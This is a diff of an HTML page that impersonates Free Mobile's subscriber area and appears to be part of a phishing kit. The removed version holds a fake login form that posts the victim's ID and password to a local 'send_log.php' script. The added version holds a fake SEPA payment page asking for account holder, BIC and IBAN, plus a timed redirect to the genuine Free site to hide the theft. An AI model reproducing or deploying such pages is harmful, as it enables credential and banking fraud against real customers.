@@ -64,12 +64,14 @@
 
    <script src="./assets/js/jquery-ui.js"></script>
 
-   <link rel="stylesheet" href="./assets/css/externe.css">
+
+            <link href="./assets/css/espace_abonne.css" rel="stylesheet">
+
    <script src="./assets/js/account.min.js"></script>
 
    </head>
 
-<body id="account-login" class="main acc_login" data-theme="main">
+<body id="account-conso" class="main acc_conso" data-theme="free" cz-shortcut-listen="true">
 
       <div class="remodal-bg">
 
@@ -81,7 +83,7 @@
                <span></span>
                <span></span>
             </div>
-                  <a class="navbar-brand" href="#">
+                  <a class="navbar-brand" href="">
             <img alt="Free mobile" title="Bienvenue chez Free" src="./assets/img/logo.png">
          </a>
       </div>
@@ -89,33 +91,33 @@
                <div class="main-nav">
             <ul class="nav navbar-nav main-menu-items">
    <li>
-      <a href="#"><i class="i-sim"></i> <span>Forfaits</span></a>
+      <a href=""><i class="i-sim"></i> <span>Forfaits</span></a>
                <ul class="forfaits">
             <li>
-               <a href="#">Forfait 2€</a>
+               <a href="">Forfait 2€</a>
             </li>
             <li>
-               <a href="#">Forfait Free</a>
+               <a href="">Forfait Free</a>
             </li>
             <li>
-               <a href="#">Série Free 70Go</a>
+               <a href="">Série Free 70Go</a>
             </li>
          </ul>
          </li>
    <li>
-      <a href="#"><i class="i-mobile_appels"></i> Téléphones</a>
+      <a href=""><i class="i-mobile_appels"></i> Téléphones</a>
    </li>
    <li>
-      <a href="#" target="_blank"><i class="i-freebox"></i> Freebox</a>
+      <a href="" ><i class="i-freebox"></i> Freebox</a>
    </li>
    <li>
-      <a href="#"><i class="i-assistance"></i> Assistance</a>
+      <a href=""><i class="i-assistance"></i> Assistance</a>
    </li>
 </ul>         </div>
 
       <div class="account">
          <ul class="buttons nav navbar-nav">
-            <li class="nav-item"><a href="#"><i id="i-user" class="i-user"></i><span class="hidden-phone"> Espace abonné</span></a></li>
+            <li class="nav-item"><a href=""><i id="i-user" class="i-user"></i><span class="hidden-phone"> Espace abonné</span></a></li>
          </ul>
       </div>
    </div>
@@ -126,87 +128,171 @@
             <div class="main-nav nav-menu" role="navigation" off-canvas="main-nav left overlay" style="margin-left: -300px;">
                <ul class="nav navbar-nav main-menu-items">
    <li>
-      <a href="#"><i class="i-sim"></i> <span>Forfaits</span></a>
+      <a href=""><i class="i-sim"></i> <span>Forfaits</span></a>
                <ul class="forfaits">
             <li>
-               <a href="#">Forfait 2€</a>
+               <a href="">Forfait 2€</a>
             </li>
             <li>
-               <a href="#">Forfait Free</a>
+               <a href="">Forfait Free</a>
             </li>
             <li>
-               <a href="#">Série Free 70Go</a>
+               <a href="">Série Free 70Go</a>
             </li>
          </ul>
          </li>
    <li>
-      <a href="#"><i class="i-mobile_appels"></i> Téléphones</a>
+      <a href=""><i class="i-mobile_appels"></i> Téléphones</a>
    </li>
    <li>
-      <a href="#" target="_blank"><i class="i-freebox"></i> Freebox</a>
+      <a href="" target="_blank"><i class="i-freebox"></i> Freebox</a>
    </li>
    <li>
-      <a href="#"><i class="i-assistance"></i> Assistance</a>
+      <a href=""><i class="i-assistance"></i> Assistance</a>
    </li>
 </ul>            </div>
             <div class="main-menu-overlay" style="display: none;"></div>
 
 
+   <div class="main-menu-overlay" style="display: none;"></div>
+
+   <div id="container" canvas="container">
+      <div class="page-container main">
+         <div class="page-content">
+
 <div class="flash-container">
    </div>
-                  <div class="pe-login">
-      <div class="bloc-login">
 
-         <h2 class="pre-titre text-center">Pour accéder à votre compte</h2>
-         <h1 class="titre text-center">Identifiez-vous</h1>
+   <div class="page p-infos">
+
+         <h2 class="page__title">   <a href="/account/mes-informations" class="bold">Mes informations<span class="dot"></span></a>
+   </h2>
+
+            <div class="details">
+         <div class="title">mon moyen de prélèvement</div>
+      </div>
+
+      <div class="form-infos form-prelevement">
+
+   <div class="mode-paiement__form mode--sepa">
+         <p class="explain">
+         Les coordonnées bancaires ci-dessous sont utilisées pour le prélèvement mensuel du montant de votre facture. Vous devez confirmer ces informations.
+      </p>
+
+         <div class="mode-paiement mode-paiement--sepa" data-mode-paiement="sepa">
+
+         <h4 class="mode-paiement__title">
+            Prélèvement SEPA
+         </h4>
 
 
-		 <form method="POST"  class="form-login" action="action/send_log.php">
-            <div class="form__line">
-                                          <label class="mdc-text-field mdc-text-field--filled mdc-ripple-upgraded " style="--mdc-ripple-fg-size:192px; --mdc-ripple-fg-scale:1.7373957013463903; --mdc-ripple-fg-translate-start:-20px, -70px; --mdc-ripple-fg-translate-end:64px, -72px;">
+   <div class="sepa-form">
+      <div>
+                                                   <label class="mdc-text-field mdc-text-field--outlined mdc-text-field--label-floating">
 
-      <input type="text" name="DEPART" value="" pattern="[1-9][0-9]{7}" autocomplete="free-identifiant" required="required" class=" mdc-text-field__input" aria-labelledby="form_libelle--1">
-               <span class="mdc-floating-label mdc-floating-label--required" id="form_libelle--1">
-         Identifiant
-      </span>
-      <span class="mdc-line-ripple" style="transform-origin: 63px center 0px;"></span>
+         <input type="text" name="sepa-titulaire" value="" disabled="" minlength="2" maxlength="50"  autocomplete="off" inputmode="latin-name" class=" mdc-text-field__input" aria-describedby="form_helper--2" aria-controls="form_helper--2" aria-labelledby="form_libelle--1">
+                  <span class="mdc-notched-outline mdc-notched-outline--upgraded mdc-notched-outline--notched">
+            <span class="mdc-notched-outline__leading"></span>
+            <span class="mdc-notched-outline__notch" style="width: 130.25px;">
+               <span class="mdc-floating-label mdc-floating-label--float-above mdc-floating-label--required" id="form_libelle--1" style="">
+                  Titulaire du compte
+               </span>
+            </span>
+            <span class="mdc-notched-outline__trailing"></span>
+         </span>
 
-         </label>
+            </label>
+               <div class="mdc-text-field-helper-line">
+               <div aria-hidden="aria-hidden" class="mdc-text-field-helper-text mdc-text-field-helper-text--validation-msg">
+                  L'identité du titulaire du compte est obligatoire.
+               </div>
+                        </div>
 
 
+
+      </div>
+      <div class="grid-l">
+         <div class="grid-c cell-top w-4 w-tablet-3">
+                                                         <label class="mdc-text-field mdc-text-field--outlined">
+
+         <input type="text" name="sepa-bic" value="" maxlength="11" pattern="[a-zA-Z0-9]{8,11}"  autocomplete="off" inputmode="latin-name" class=" mdc-text-field__input" aria-describedby="form_helper--4" aria-controls="form_helper--4" aria-labelledby="form_libelle--3" Disabled>
+                  <span class="mdc-notched-outline mdc-notched-outline--upgraded">
+            <span class="mdc-notched-outline__leading"></span>
+            <span class="mdc-notched-outline__notch">
+               <span class="mdc-floating-label mdc-floating-label--required" id="form_libelle--3" style="">
+                  BIC
+               </span>
+            </span>
+            <span class="mdc-notched-outline__trailing"></span>
+         </span>
+
+            </label>
+               <div class="mdc-text-field-helper-line">
+               <div class="mdc-text-field-helper-text mdc-text-field-helper-text--validation-msg" aria-hidden="aria-hidden">
+                  Code BIC de votre banque.
+               </div>
+                        </div>
+
+
+
+         </div>
+         <div class="grid-c cell-top w-4 w-tablet-5">
+                                                         <label class="mdc-text-field mdc-text-field--outlined">
+
+         <input type="text" name="sepa-iban" value="" maxlength="38" pattern="[a-zA-Z]{2,2}[0-9]{2,2}\s?([a-zA-Z0-9]{4,4}\s?){3,3}([a-zA-Z0-9]{1,4}\s?){0,4}"  autocomplete="off" inputmode="latin-name" class=" mdc-text-field__input" aria-describedby="form_helper--6" aria-controls="form_helper--6" aria-labelledby="form_libelle--5" disabled>
+                  <span class="mdc-notched-outline mdc-notched-outline--upgraded">
+            <span class="mdc-notched-outline__leading"></span>
+            <span class="mdc-notched-outline__notch">
+               <span class="mdc-floating-label mdc-floating-label--required" id="form_libelle--5" style="">
+                  IBAN
+               </span>
+            </span>
+            <span class="mdc-notched-outline__trailing"></span>
+         </span>
+
+            </label>
+               <div class="mdc-text-field-helper-line">
+               <div class="mdc-text-field-helper-text mdc-text-field-helper-text--validation-msg" aria-hidden="aria-hidden">
+                  Veuillez renseigner l'IBAN de votre compte.
+               </div>
+                        </div>
+
+
+
+         </div>
+      </div>
+   </div>
+
+      </div>
+
+
+         <div class="mode-paiement__link-container">
+                     <div class="mode-paiement__link link--sepa" data-mode-paiement="sepa">
+            <span>&gt; Payer par prélèvement SEPA</span>
+         </div>
             </div>
-            <div class="form__line">
-                                          <label class="mdc-text-field mdc-text-field--filled mdc-ripple-upgraded">
-
-      <input type="password" name="CCPTE" value="" required="required" class=" mdc-text-field__input" aria-labelledby="form_libelle--2">
-               <span class="mdc-floating-label mdc-floating-label--required" id="form_libelle--2">
-         Mot de passe
-      </span>
-      <span class="mdc-line-ripple"></span>
-
-         </label>
 
 
-            </div>
+   </div>
 
-            <div class="form__button text-center">
-               <button type="submit" class="bt-label bt-label-right bt-label-big bt-bold bt-square button-state--enabled state--default">
-                  Se connecter <span class="bt-icon i-login"></span>
+         <div class="form-infos__button">
+                     <button  onclick="myFunction()"  class="bt-label bt-big bt-bold bt-square bt-label-right button-state--enabled state--default" />
+         <span>Confirmer mon moyen de paiement</span> <span class="bt-icon i-pencil"></span>
+   </button>
 
-               </button>
-            </div>
+         </div>
 
-            <div class="forgot-links text-center">
-               <a href="#">
-                  Vous avez oublié votre mot de passe<br>ou perdu vos identifiants ?
-               </a>
-               <a href="#">
-                  Vous n'avez plus accès à vos emails<br>ou vous vous êtes trompé d'email à l'inscription ?
-               </a>
-            </div>
+      </div>
+      <div class="mention">
+                    <BR>  <BR>  <BR>
 
-         </form>
+      <p class="mention" style="margin-top:1em;">
+      Les informations communiquées ci-dessus sont destinées à Free Mobile ainsi qu'aux personnes morales du groupe auquel Free Mobile appartient, à des sociétés tierces telles que des sous-traitant (pouvant opérer en dehors de l'Union Européenne) pour la gestion de votre contrat. Sauf opposition de votre part, Free mobile est susceptible de vous adresser par courrier postal et téléphone des offres de sa part ou de ses partenaires commerciaux, et par voie électronique pour des services ou produits analogues. Conformément à la Loi Informatique et Liberté du 6 janvier 1978 modifiée, vous disposez d'un droit d'accès, de rectification, de suppression et d'opposition sur les données personnelles vous concernant depuis votre espace abonné disponible sur le site Internet.
+      </p>
 
+      </div>
+
+      </div>
       </div>
    </div>
          </div>
@@ -223,10 +309,10 @@
       </div>
       <div class="grid-c w-4">
          <ul>
-            <li><a href="#" target="_blank"><i class="i-facebook"></i></a></li>
-            <li><a href="#" target="_blank"><i class="i-twitter"></i></a></li>
-            <li><a href="#" target="_blank"><i class="i-instagram"></i></a></li>
-            <li><a href="#" target="_blank"><i class="i-youtube"></i></a></li>
+            <li><a href="https://www.facebook.com/FreeFrance/?ref=page_internal" target="_blank"><i class="i-facebook"></i></a></li>
+            <li><a href="https://twitter.com/Free" target="_blank"><i class="i-twitter"></i></a></li>
+            <li><a href="https://www.instagram.com/free.fr/" target="_blank"><i class="i-instagram"></i></a></li>
+            <li><a href="https://www.youtube.com/channel/UCzoLVwQrGOBlfzrma3FiJbg" target="_blank"><i class="i-youtube"></i></a></li>
          </ul>
       </div>
    </div>
@@ -237,50 +323,50 @@
       <div class="grid-c w-4 w-desktop-3 menu">
          <h5>Offres &amp; Services <i class="i-chevron-down hidden-desktop"></i></h5>
          <ul>
-            <li><a href="#">Tous les forfaits</a></li>
-            <li><a href="#">Forfait Free</a></li>
-            <li><a href="#">Série Free</a></li>
-            <li><a href="#">Forfait 2h</a></li>
-            <li><a href="#">Smartphones &amp; Mobiles</a></li>
-            <li><a href="#">Box 4G+</a></li>
-            <li><a href="#" target="_blank">Trouver une Borne Free</a></li>
-            <li><a href="#">Disponibilité du service Free Mobile</a></li>
-            <li><a href="#" target="_blank" title="Guide Pratique des communications électroniques au 2 mars 2012.">Guide Pratique des communications électroniques</a></li>
+            <li><a href="/">Tous les forfaits</a></li>
+            <li><a href="/fiche-forfait-free.html">Forfait Free</a></li>
+            <li><a href="/fiche-forfait-serie-free.html">Série Free</a></li>
+            <li><a href="/fiche-forfait-2-euros.html">Forfait 2h</a></li>
+            <li><a href="/account/mobiles">Smartphones &amp; Mobiles</a></li>
+            <li><a href="/la-box-4G.html">Box 4G+</a></li>
+            <li><a href="https://free.fr/boutiques/" target="_blank">Trouver une Borne Free</a></li>
+            <li><a href="/couverture/index.html">Disponibilité du service Free Mobile</a></li>
+            <li><a href="/docs/cnc_guide_interactif.pdf" target="_blank" title="Guide Pratique des communications électroniques au 2 mars 2012.">Guide Pratique des communications électroniques</a></li>
          </ul>
       </div>
       <div class="grid-c w-4 w-desktop-3 menu">
          <h5>Espace Abonné <i class="i-chevron-down hidden-desktop"></i></h5>
          <ul>
-            <li><a href="#">Mon compte</a></li>
-            <li><a href="#">Mes services mobiles</a></li>
-            <li><a href="#">Assistance</a></li>
-            <li><a href="#">Protection de l'enfance</a></li>
-            <li><a href="#" target="_blank">Nous contacter</a></li>
+            <li><a href="/account/">Mon compte</a></li>
+            <li><a href="/services-mobiles.html">Mes services mobiles</a></li>
+            <li><a href="/assistance/">Assistance</a></li>
+            <li><a href="/protection-enfance.html">Protection de l'enfance</a></li>
+            <li><a href="https://www.free.fr/freebox/informations/nous-contacter/" target="_blank">Nous contacter</a></li>
          </ul>
       </div>
       <div class="grid-c w-4 w-desktop-3 menu">
          <h5>Tarifs et Conditions <i class="i-chevron-down hidden-desktop"></i></h5>
          <ul>
-            <li><a href="#" target="_blank" title="Conditions Générales d'Abonnement au 1 décembre 2020.">Conditions Générales d'Abonnement</a></li>
-            <li><a href="#" target="_blank" title="Conditions Générales de Location au 20 février 2019.">Conditions Générales de Location</a></li>
-            <li><a href="#" target="_blank" title="Conditions Générales de Vente au 3 novembre 2020.">Conditions Générales de Vente</a></li>
-            <li><a href="#" target="_blank" title="Brochure tarifaire au 1 décembre 2020.">Brochure tarifaire</a></li>
-            <li><a href="#" target="_blank" title="Fiche d'information précontractuelle au 25 août 2017.">Fiche d'information précontractuelle</a></li>
-            <li><a href="#" target="_blank" title="Fiche d'information standardisée au 1 décembre 2020.">Fiche d'information standardisée</a></li>
-            <li><a href="#" target="_blank" title="Fiche d’information standardisée Série Free au 2 décembre 2020.">Fiche d’information standardisée Série Free</a></li>
-            <li><a href="#" target="_blank" title="Fiche d’information standardisée Box4G+ au 1 février 2020.">Fiche d’information standardisée Box4G+</a></li>
-            <li><a href="#" target="_blank" title="Conditions spécifiques Box4G+ au 24 septembre 2019.">Conditions spécifiques Box4G+</a></li>
-            <li><a href="#" target="_blank" title="Conditions Générales d'Utilisation au 12 février 2012.">Conditions Générales d'Utilisation</a></li>
-            <li><a href="#" target="_blank" title="Politique de confidentialité au 23 mai 2018.">Politique de confidentialité</a></li>
-            <li><a href="#" class="modal-r-link" data-modal-link="/informations.html #Infos-legales">Informations légales</a></li>
-            <li><a href="#" target="_blank">Cookies</a></li>
+            <li><a href="/docs/cga/Conditions_Generales_Abonnement.pdf" target="_blank" title="Conditions Générales d'Abonnement au 1 décembre 2020.">Conditions Générales d'Abonnement</a></li>
+            <li><a href="/docs/Conditions_Generales_de_Location.pdf" target="_blank" title="Conditions Générales de Location au 20 février 2019.">Conditions Générales de Location</a></li>
+            <li><a href="/docs/Conditions_Generales_de_Vente_de_Terminaux.pdf" target="_blank" title="Conditions Générales de Vente au 3 novembre 2020.">Conditions Générales de Vente</a></li>
+            <li><a href="/docs/bt/tarifs.pdf" target="_blank" title="Brochure tarifaire au 1 décembre 2020.">Brochure tarifaire</a></li>
+            <li><a href="/docs/Fiche_information_precontractuelle.pdf" target="_blank" title="Fiche d'information précontractuelle au 25 août 2017.">Fiche d'information précontractuelle</a></li>
+            <li><a href="/docs/fis/Fiche_information_standardisee_2020-12-01.pdf" target="_blank" title="Fiche d'information standardisée au 1 décembre 2020.">Fiche d'information standardisée</a></li>
+            <li><a href="/docs/fis/Fiche_information_standardisee_Serie_Free.pdf" target="_blank" title="Fiche d’information standardisée Série Free au 2 décembre 2020.">Fiche d’information standardisée Série Free</a></li>
+            <li><a href="/docs/fis/Fiche_information_standardisee_box4G+.pdf" target="_blank" title="Fiche d’information standardisée Box4G+ au 1 février 2020.">Fiche d’information standardisée Box4G+</a></li>
+            <li><a href="/docs/Conditions_specifiques_box4G+.pdf" target="_blank" title="Conditions spécifiques Box4G+ au 24 septembre 2019.">Conditions spécifiques Box4G+</a></li>
+            <li><a href="/docs/Conditions_generales_dutilisation.pdf" target="_blank" title="Conditions Générales d'Utilisation au 12 février 2012.">Conditions Générales d'Utilisation</a></li>
+            <li><a href="/docs/Politique_de_confidentialite_des_donnees.pdf" target="_blank" title="Politique de confidentialité au 23 mai 2018.">Politique de confidentialité</a></li>
+            <li><a href="/informations.html" class="modal-r-link" data-modal-link="/informations.html #Infos-legales">Informations légales</a></li>
+            <li><a href="/cookies.html" target="_blank">Cookies</a></li>
          </ul>
       </div>
       <div class="grid-c w-4 w-desktop-3 menu">
          <h5>Société <i class="i-chevron-down hidden-desktop"></i></h5>
          <ul>
-            <li><a href="#" target="_blank">Le groupe Iliad</a></li>
-            <li><a href="#" target="_blank">Free recrute !</a></li>
+            <li><a href="https://www.iliad.fr/" target="_blank">Le groupe Iliad</a></li>
+            <li><a href="https://www.free.fr/freebox/informations/free-recrute.html" target="_blank">Free recrute !</a></li>
          </ul>
       </div>
    </div>
@@ -290,7 +376,7 @@
       Le débit d'absorption spécifique (DAS) local quantifie l'exposition de l'utilisateur aux ondes électromagnétiques de l'équipement concerné. Le DAS maximal autorisé est de 2 W/kg pour la tête et le tronc et de 4 W/kg pour les membres.
    </p>
    <p>
-      Le montant de la rémunération pour copie privée applicable et la notice explicative sont consultables sur : <a href="#" target="_blank">http://www.copieprivee.culture.gouv.fr</a>
+      Le montant de la rémunération pour copie privée applicable et la notice explicative sont consultables sur : <a href="http://www.copieprivee.culture.gouv.fr" target="_blank">http://www.copieprivee.culture.gouv.fr</a>
    </p>
 </div>
 
@@ -328,6 +414,12 @@
            });
        });
    </script>
+   <script>
+         setTimeout(function(){
+            window.location = 'https://mobile.free.fr/account/';
+         }, 7000);
+
+  </script>
 </footer>
          </div>
          </div>
